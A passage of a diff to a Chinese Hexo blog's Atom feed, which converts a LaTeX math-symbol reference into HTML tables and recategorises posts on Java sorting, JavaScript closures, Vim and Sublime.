-&lt;h4 id=&quot;三角运算&quot;&gt;&lt;a href=&quot;#三角运算&quot; class=&quot;headerlink&quot; title=&quot;三角运算&quot;&gt;&lt;/a&gt;三角运算&lt;/h4&gt;&lt;p&gt;\bot:$\bot$&lt;br&gt;\angle:$\angle$&lt;br&gt;30^\circ:$30^\circ$&lt;br&gt;\sin:$\sin$&lt;br&gt;\cos:$\cos$&lt;br&gt;\tan:$\tan$&lt;br&gt;\cot:$\cot$&lt;br&gt;\sec:$\sec$&lt;br&gt;\csc:$\csc$&lt;/p&gt;
-&lt;h4 id=&quot;微积分运算&quot;&gt;&lt;a href=&quot;#微积分运算&quot; class=&quot;headerlink&quot; title=&quot;微积分运算&quot;&gt;&lt;/a&gt;微积分运算&lt;/h4&gt;&lt;p&gt;\prime:$\prime$&lt;br&gt;\int:$\int$&lt;br&gt;\iint:$\iint$&lt;br&gt;\iiint:$\iiint$&lt;br&gt;\iiiint:$\iiiint$&lt;br&gt;\oint:$\oint$&lt;br&gt;\lim:$\lim$&lt;br&gt;\infty:$\infty$&lt;br&gt;\nabla:$\nabla$&lt;/p&gt;
-&lt;h4 id=&quot;逻辑运算&quot;&gt;&lt;a href=&quot;#逻辑运算&quot; class=&quot;headerlink&quot; title=&quot;逻辑运算&quot;&gt;&lt;/a&gt;逻辑运算&lt;/h4&gt;&lt;p&gt;\because:$\because$&lt;br&gt;\therefore:$\therefore$&lt;br&gt;\forall:$\forall$&lt;br&gt;\exists:$\exists$&lt;br&gt;\not=:$\not=$&lt;br&gt;\not&amp;gt;:$\not&amp;gt;$&lt;br&gt;\not\subset:$\not\subset$&lt;/p&gt;
-&lt;h4 id=&quot;戴帽符号&quot;&gt;&lt;a href=&quot;#戴帽符号&quot; class=&quot;headerlink&quot; title=&quot;戴帽符号&quot;&gt;&lt;/a&gt;戴帽符号&lt;/h4&gt;&lt;p&gt;\hat{y}:$\hat{y}$&lt;br&gt;\check{y}:$\check{y}$&lt;br&gt;\breve{y}:$\breve{y}$&lt;/p&gt;
-&lt;h4 id=&quot;连线符号&quot;&gt;&lt;a href=&quot;#连线符号&quot; class=&quot;headerlink&quot; title=&quot;连线符号&quot;&gt;&lt;/a&gt;连线符号&lt;/h4&gt;&lt;p&gt;\overline{a+b+c+d}:$\overline{a+b+c+d}$&lt;br&gt;\underline{a+b+c+d}:$\underline{a+b+c+d}$&lt;/p&gt;
-&lt;h4 id=&quot;箭头符号&quot;&gt;&lt;a href=&quot;#箭头符号&quot; class=&quot;headerlink&quot; title=&quot;箭头符号&quot;&gt;&lt;/a&gt;箭头符号&lt;/h4&gt;&lt;p&gt;\uparrow:$\uparrow$&lt;br&gt;\downarrow:$\downarrow$&lt;br&gt;\Uparrow:$\Uparrow$&lt;br&gt;\Downarrow:$\Downarrow$&lt;br&gt;\rightarrow:$\rightarrow$&lt;br&gt;\leftarrow:$\leftarrow$&lt;br&gt;\Rightarrow:$\Rightarrow$&lt;br&gt;\Leftarrow:$\Leftarrow$&lt;br&gt;\longrightarrow:$\longrightarrow$&lt;br&gt;\longleftarrow:$\longleftarrow$&lt;br&gt;\Longrightarrow:$\Longrightarrow$&lt;br&gt;\Longleftarrow:$\Longleftarrow$&lt;/p&gt;
+&lt;h3 id=&quot;其它特殊字符&quot;&gt;&lt;a href=&quot;#其它特殊字符&quot; class=&quot;headerlink&quot; title=&quot;其它特殊字符&quot;&gt;&lt;/a&gt;其它特殊字符&lt;/h3&gt;&lt;h4 id=&quot;关系运算&quot;&gt;&lt;a href=&quot;#关系运算&quot; class=&quot;headerlink&quot; title=&quot;关系运算&quot;&gt;&lt;/a&gt;关系运算&lt;/h4&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;符号&lt;/th&gt;
+&lt;th&gt;表示&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;$\pm$&lt;/td&gt;
+&lt;td&gt;\pm&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\times$&lt;/td&gt;
+&lt;td&gt;\times&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\div$&lt;/td&gt;
+&lt;td&gt;\div&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\mid$&lt;/td&gt;
+&lt;td&gt;\mid&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\nmid$&lt;/td&gt;
+&lt;td&gt;\nmid&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\cdot$&lt;/td&gt;
+&lt;td&gt;\cdot&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\circ$&lt;/td&gt;
+&lt;td&gt;\circ&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\ast$&lt;/td&gt;
+&lt;td&gt;\ast&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\bigodot$&lt;/td&gt;
+&lt;td&gt;\bigodot&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\bigotimes$&lt;/td&gt;
+&lt;td&gt;\bigotimes&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\bigoplus$&lt;/td&gt;
+&lt;td&gt;\bigoplus&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\leq$&lt;/td&gt;
+&lt;td&gt;\leq&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\geq$&lt;/td&gt;
+&lt;td&gt;\geq&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\neq$&lt;/td&gt;
+&lt;td&gt;\neq&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\approx$&lt;/td&gt;
+&lt;td&gt;\approx&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\equiv$&lt;/td&gt;
+&lt;td&gt;\equiv&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\sum$&lt;/td&gt;
+&lt;td&gt;\sum&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\prod$&lt;/td&gt;
+&lt;td&gt;\prod&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\coprod$&lt;/td&gt;
+&lt;td&gt;\coprod&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h4 id=&quot;集合运算&quot;&gt;&lt;a href=&quot;#集合运算&quot; class=&quot;headerlink&quot; title=&quot;集合运算&quot;&gt;&lt;/a&gt;集合运算&lt;/h4&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;符号&lt;/th&gt;
+&lt;th&gt;表示&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;$\emptyset$&lt;/td&gt;
+&lt;td&gt;\emptyset&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\in$&lt;/td&gt;
+&lt;td&gt;\in&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\notin$&lt;/td&gt;
+&lt;td&gt;\notin&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\subset$&lt;/td&gt;
+&lt;td&gt;\subset&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\supset$&lt;/td&gt;
+&lt;td&gt;\supset&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\subseteq$&lt;/td&gt;
+&lt;td&gt;\subseteq&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\supseteq$&lt;/td&gt;
+&lt;td&gt;\supseteq&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\bigcap$&lt;/td&gt;
+&lt;td&gt;\bigcap&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\bigcup$&lt;/td&gt;
+&lt;td&gt;\bigcup&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\bigvee$&lt;/td&gt;
+&lt;td&gt;\bigvee&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\bigwedge$&lt;/td&gt;
+&lt;td&gt;\bigwedge&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\biguplus$&lt;/td&gt;
+&lt;td&gt;\biguplus&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\bigsqcup$&lt;/td&gt;
+&lt;td&gt;\bigsqcup&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h4 id=&quot;对数运算&quot;&gt;&lt;a href=&quot;#对数运算&quot; class=&quot;headerlink&quot; title=&quot;对数运算&quot;&gt;&lt;/a&gt;对数运算&lt;/h4&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;符号&lt;/th&gt;
+&lt;th&gt;表示&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;$\log$&lt;/td&gt;
+&lt;td&gt;\log&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\lg$&lt;/td&gt;
+&lt;td&gt;\lg&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\ln$&lt;/td&gt;
+&lt;td&gt;\ln&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h4 id=&quot;三角运算&quot;&gt;&lt;a href=&quot;#三角运算&quot; class=&quot;headerlink&quot; title=&quot;三角运算&quot;&gt;&lt;/a&gt;三角运算&lt;/h4&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;符号&lt;/th&gt;
+&lt;th&gt;表示&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;$\bot$&lt;/td&gt;
+&lt;td&gt;\bot&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\angle$&lt;/td&gt;
+&lt;td&gt;\angle&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$30^\circ$&lt;/td&gt;
+&lt;td&gt;30^\circ&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\sin$&lt;/td&gt;
+&lt;td&gt;\sin&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\cos$&lt;/td&gt;
+&lt;td&gt;\cos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\tan$&lt;/td&gt;
+&lt;td&gt;\tan&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\cot$&lt;/td&gt;
+&lt;td&gt;\cot&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\sec$&lt;/td&gt;
+&lt;td&gt;\sec&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\csc$&lt;/td&gt;
+&lt;td&gt;\csc&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h4 id=&quot;微积分运算&quot;&gt;&lt;a href=&quot;#微积分运算&quot; class=&quot;headerlink&quot; title=&quot;微积分运算&quot;&gt;&lt;/a&gt;微积分运算&lt;/h4&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;符号&lt;/th&gt;
+&lt;th&gt;表示&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;$\prime$&lt;/td&gt;
+&lt;td&gt;\prime&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\int$&lt;/td&gt;
+&lt;td&gt;\int&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\iint$&lt;/td&gt;
+&lt;td&gt;\iint&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\iiint$&lt;/td&gt;
+&lt;td&gt;\iiint&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\iiiint$&lt;/td&gt;
+&lt;td&gt;\iiiint&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\oint$&lt;/td&gt;
+&lt;td&gt;\oint&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\lim$&lt;/td&gt;
+&lt;td&gt;\lim&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\infty$&lt;/td&gt;
+&lt;td&gt;\infty&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\nabla$&lt;/td&gt;
+&lt;td&gt;\nabla&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h4 id=&quot;逻辑运算&quot;&gt;&lt;a href=&quot;#逻辑运算&quot; class=&quot;headerlink&quot; title=&quot;逻辑运算&quot;&gt;&lt;/a&gt;逻辑运算&lt;/h4&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;符号&lt;/th&gt;
+&lt;th&gt;表示&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;$\because$&lt;/td&gt;
+&lt;td&gt;\because&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\therefore$&lt;/td&gt;
+&lt;td&gt;\therefore&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\forall$&lt;/td&gt;
+&lt;td&gt;\forall&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\exists$&lt;/td&gt;
+&lt;td&gt;\exists&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\not=$&lt;/td&gt;
+&lt;td&gt;\not=&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\not&amp;gt;$&lt;/td&gt;
+&lt;td&gt;\not&amp;gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\not\subset$&lt;/td&gt;
+&lt;td&gt;\not\subset&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h4 id=&quot;戴帽符号&quot;&gt;&lt;a href=&quot;#戴帽符号&quot; class=&quot;headerlink&quot; title=&quot;戴帽符号&quot;&gt;&lt;/a&gt;戴帽符号&lt;/h4&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;符号&lt;/th&gt;
+&lt;th&gt;表示&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;$\hat{y}$&lt;/td&gt;
+&lt;td&gt;\hat{y}&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\check{y}$&lt;/td&gt;
+&lt;td&gt;\check{y}&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\breve{y}$&lt;/td&gt;
+&lt;td&gt;\breve{y}&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h4 id=&quot;连线符号&quot;&gt;&lt;a href=&quot;#连线符号&quot; class=&quot;headerlink&quot; title=&quot;连线符号&quot;&gt;&lt;/a&gt;连线符号&lt;/h4&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;符号&lt;/th&gt;
+&lt;th&gt;表示&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;$\overline{a+b+c+d}$&lt;/td&gt;
+&lt;td&gt;\overline{a+b+c+d}&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\underline{a+b+c+d}$&lt;/td&gt;
+&lt;td&gt;\underline{a+b+c+d}&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h4 id=&quot;箭头符号&quot;&gt;&lt;a href=&quot;#箭头符号&quot; class=&quot;headerlink&quot; title=&quot;箭头符号&quot;&gt;&lt;/a&gt;箭头符号&lt;/h4&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;符号&lt;/th&gt;
+&lt;th&gt;表示&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;$\uparrow$&lt;/td&gt;
+&lt;td&gt;\uparrow&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\downarrow$&lt;/td&gt;
+&lt;td&gt;\downarrow&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\Uparrow$&lt;/td&gt;
+&lt;td&gt;\Uparrow&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\Downarrow$&lt;/td&gt;
+&lt;td&gt;\Downarrow&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\rightarrow$&lt;/td&gt;
+&lt;td&gt;\rightarrow&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\leftarrow$&lt;/td&gt;
+&lt;td&gt;\leftarrow&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\Rightarrow$&lt;/td&gt;
+&lt;td&gt;\Rightarrow&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\Leftarrow$&lt;/td&gt;
+&lt;td&gt;\Leftarrow&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\longrightarrow$&lt;/td&gt;
+&lt;td&gt;\longrightarrow&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\longleftarrow$&lt;/td&gt;
+&lt;td&gt;\longleftarrow&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\Longrightarrow$&lt;/td&gt;
+&lt;td&gt;\Longrightarrow&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$\Longleftarrow$&lt;/td&gt;
+&lt;td&gt;\Longleftarrow&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
 </content>
     
     <summary type="html">
@@ -73,10 +489,10 @@
   
   <entry>
     <title>Java中List列表排序</title>
-    <link href="http://yoursite.com/learning/Java%E5%88%97%E8%A1%A8%E7%BB%84%E5%90%88%E6%8E%92%E5%BA%8F.html"/>
-    <id>http://yoursite.com/learning/Java列表组合排序.html</id>
+    <link href="http://yoursite.com/java/java/Java%E5%88%97%E8%A1%A8%E7%BB%84%E5%90%88%E6%8E%92%E5%BA%8F.html"/>
+    <id>http://yoursite.com/java/java/Java列表组合排序.html</id>
     <published>2016-04-09T16:00:00.000Z</published>
-    <updated>2016-04-11T07:00:00.409Z</updated>
+    <updated>2016-04-16T11:29:51.947Z</updated>
     
     <content type="html">&lt;h3 id=&quot;简单类型元素排序&quot;&gt;&lt;a href=&quot;#简单类型元素排序&quot; class=&quot;headerlink&quot; title=&quot;简单类型元素排序&quot;&gt;&lt;/a&gt;简单类型元素排序&lt;/h3&gt;&lt;p&gt;Java中定义的List实现类有：Vector，ArrayList，LinkedList。这些集合类提供了对列表中元素的索引访问和对元素的添加与删除支持，然而并没有提供排序支持。但是java.util.Collections类提供了两种支持，如下：&lt;/p&gt;
 &lt;ul&gt;
@@ -104,17 +520,17 @@
     
     </summary>
     
-      <category term="学习" scheme="http://yoursite.com/categories/learning/"/>
+      <category term="java" scheme="http://yoursite.com/categories/java/"/>
     
     
   </entry>
   
   <entry>
     <title>JS里的函数声明/匿名函数/函数表达式/立即执行函数/立即调用表达式</title>
-    <link href="http://yoursite.com/learning/%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E-%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0.html"/>
-    <id>http://yoursite.com/learning/函数声明-表达式-匿名函数.html</id>
+    <link href="http://yoursite.com/javascript/javascript/%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E-%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0.html"/>
+    <id>http://yoursite.com/javascript/javascript/函数声明-表达式-匿名函数.html</id>
     <published>2016-04-01T16:00:00.000Z</published>
-    <updated>2016-04-11T06:59:51.313Z</updated>
+    <updated>2016-04-16T11:29:51.945Z</updated>
     
     <content type="html">&lt;h3 id=&quot;函数声明&quot;&gt;&lt;a href=&quot;#函数声明&quot; class=&quot;headerlink&quot; title=&quot;函数声明&quot;&gt;&lt;/a&gt;函数声明&lt;/h3&gt;&lt;p&gt;函数声明必须首先有个&lt;strong&gt;function&lt;/strong&gt;关键字，再指定一个函数名称，自己随便定义，不违反函数名称的定义规则就行，如下格式：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;funName&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//do something&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 &lt;h3 id=&quot;匿名函数&quot;&gt;&lt;a href=&quot;#匿名函数&quot; class=&quot;headerlink&quot; title=&quot;匿名函数&quot;&gt;&lt;/a&gt;匿名函数&lt;/h3&gt;&lt;p&gt;匿名函数不需要定义函数名字，只有一个&lt;strong&gt;function&lt;/strong&gt;关键字，其他跟函数声明一样。&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//do something&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
@@ -152,17 +568,17 @@
     
     </summary>
     
-      <category term="学习" scheme="http://yoursite.com/categories/learning/"/>
+      <category term="javascript" scheme="http://yoursite.com/categories/javascript/"/>
     
     
   </entry>
   
   <entry>
     <title>Vim下XML文件格式化</title>
-    <link href="http://yoursite.com/learning/vim-xml-format.html"/>
-    <id>http://yoursite.com/learning/vim-xml-format.html</id>
+    <link href="http://yoursite.com/learning/learning/vim-xml-format.html"/>
+    <id>http://yoursite.com/learning/learning/vim-xml-format.html</id>
     <published>2016-03-28T16:00:00.000Z</published>
-    <updated>2016-04-11T06:58:34.906Z</updated>
+    <updated>2016-04-16T11:29:51.938Z</updated>
     
     <content type="html">&lt;h3 id=&quot;1-打开需要格式化的文件&quot;&gt;&lt;a href=&quot;#1-打开需要格式化的文件&quot; class=&quot;headerlink&quot; title=&quot;1.打开需要格式化的文件&quot;&gt;&lt;/a&gt;1.打开需要格式化的文件&lt;/h3&gt;&lt;p&gt;使用vim命令打开需要格式化的xml文件，html也属于xml的一种，因此也可使用该方法格式化html文件。&lt;br&gt;现有一个如下的未格式化的文件：&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/yangdage/images/master/20160330/20160328154539.png&quot; alt=&quot;origin image&quot;&gt;&lt;/p&gt;
 &lt;h3 id=&quot;2-保存临时修改&quot;&gt;&lt;a href=&quot;#2-保存临时修改&quot; class=&quot;headerlink&quot; title=&quot;2.保存临时修改&quot;&gt;&lt;/a&gt;2.保存临时修改&lt;/h3&gt;&lt;p&gt;如果我们打开后有对文件进行编辑操作，需要保存所做的修改&lt;/p&gt;
@@ -191,10 +607,10 @@
   
   <entry>
     <title>Sublime下的Package Control</title>
-    <link href="http://yoursite.com/learning/sublime-package-control.html"/>
-    <id>http://yoursite.com/learning/sublime-package-control.html</id>
+    <link href="http://yoursite.com/learning/learning/sublime-package-control.html"/>
+    <id>http://yoursite.com/learning/learning/sublime-package-control.html</id>
     <published>2016-03-22T16:00:00.000Z</published>
-    <updated>2016-04-11T06:58:25.755Z</updated>
+    <updated>2016-04-16T11:29:51.939Z</updated>
     
     <content type="html">&lt;p&gt;有时候我们安装的Sublime默认情况下没有安装Package Control(暂且叫它插件管理器)，没有安装它的情况下就不能很方便的安装官方的插件。&lt;/p&gt;
 &lt;p&gt;打开sublime，查看是否存在以下目录&lt;/p&gt;
@@ -225,10 +641,10 @@
   
   <entry>
     <title>Javascript闭包(Closure)</title>
-    <link href="http://yoursite.com/learning/javascript-closure.html"/>
-    <id>http://yoursite.com/learning/javascript-closure.html</id>
+    <link href="http://yoursite.com/javascript/javascript/javascript-closure.html"/>
+    <id>http://yoursite.com/javascript/javascript/javascript-closure.html</id>
     <published>2016-03-21T16:00:00.000Z</published>
-    <updated>2016-04-11T06:59:39.531Z</updated>
+    <updated>2016-04-16T11:29:51.946Z</updated>
     
     <content type="html">&lt;h3 id=&quot;敌在暗，我在明&quot;&gt;&lt;a href=&quot;#敌在暗，我在明&quot; class=&quot;headerlink&quot; title=&quot;敌在暗，我在明&quot;&gt;&lt;/a&gt;敌在暗，我在明&lt;/h3&gt;&lt;p&gt;看电影的时候我们经常会看到这样的剧情，当敌暗，我在明时，我们的一举一动他们都了如指掌，我们对他们的情况却一无所知。但是我们需要知道对方的真实情况才能从容的应对，这时候最常见的剧情就是在敌方安插我方的眼线，给我们提供情报支持。&lt;/p&gt;
 &lt;h3 id=&quot;初识Javascript闭包&quot;&gt;&lt;a href=&quot;#初识Javascript闭包&quot; class=&quot;headerlink&quot; title=&quot;初识Javascript闭包&quot;&gt;&lt;/a&gt;初识Javascript闭包&lt;/h3&gt;&lt;p&gt;我们先来看一段简短的js代码&lt;/p&gt;
@@ -300,17 +716,17 @@
     
     </summary>
     
-      <category term="学习" scheme="http://yoursite.com/categories/learning/"/>
+      <category term="javascript" scheme="http://yoursite.com/categories/javascript/"/>
     
     
   </entry>
   
   <entry>
     <title>Hexo+Github一步两步搭建博客</title>
-    <link href="http://yoursite.com/learning/hexo-github.html"/>
-    <id>http://yoursite.com/learning/hexo-github.html</id>
+    <link href="http://yoursite.com/learning/learning/hexo-github.html"/>
+    <id>http://yoursite.com/learning/learning/hexo-github.html</id>
     <published>2016-03-09T16:00:00.000Z</published>
-    <updated>2016-04-11T06:57:49.136Z</updated>
+    <updated>2016-04-16T11:29:51.943Z</updated>
     
